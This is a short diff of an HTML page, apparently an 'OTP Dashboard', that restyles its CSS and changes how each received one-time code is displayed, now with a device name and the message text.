@@ -9,20 +9,22 @@ body {
   background: #0f172a;
   color: white;
   font-family: Arial;
+  padding: 20px;
 }
 
 .item {
   background: #1e293b;
-  padding: 10px;
-  margin: 5px 0;
-  border-radius: 6px;
+  padding: 12px;
+  margin: 8px 0;
+  border-radius: 8px;
+  white-space: pre-line;
 }
 </style>
 
 </head>
 <body>
 
-<h2>📩 OTP nhận được</h2>
+<h2>📩 OTP Dashboard</h2>
 <div id="list"></div>
 
 <script>
@@ -44,16 +46,16 @@ function load() {
     data.forEach(s => {
       let div = document.createElement("div");
       div.className = "item";
+
       div.innerText =
-        "OTP: " + s.otp + "\n" +
-        s.content;
+        "📱 " + (s.device || "Unknown device") + "\n" +
+        "🔢 OTP: " + s.otp + "\n" +
+        "📩 " + s.content;
 
       list.appendChild(div);
     });
   })
-  .catch(err => {
-    console.log(err);
-  });
+  .catch(err => console.log(err));
 }
 
 // load lần đầu
